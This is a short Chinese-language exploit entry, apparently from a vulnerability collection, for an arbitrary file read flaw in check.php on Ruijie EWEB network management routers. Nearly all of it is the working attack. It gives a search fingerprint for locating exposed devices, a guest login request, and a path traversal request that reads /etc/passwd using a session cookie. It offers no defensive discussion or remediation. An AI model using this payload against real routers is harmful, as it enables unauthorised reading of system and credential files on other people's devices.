# 锐捷EWEB路由器check.php存在任意文件读取漏洞

锐捷 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="锐捷网络-EWEB网管系统"`
- **请求**：`POST /ddi/server/login.php HTTP/1.1`

**Payload**
```
username=guest&password=guest?
利用可用cookie访问接口
GET /check.php?a=index&url=../../../../../etc/passwd HTTP/1.1
Host:
Cookie: RUIJIEID=ukdd3427at8dfl0ku8h9rq40n3;
```
- **响应特征**：200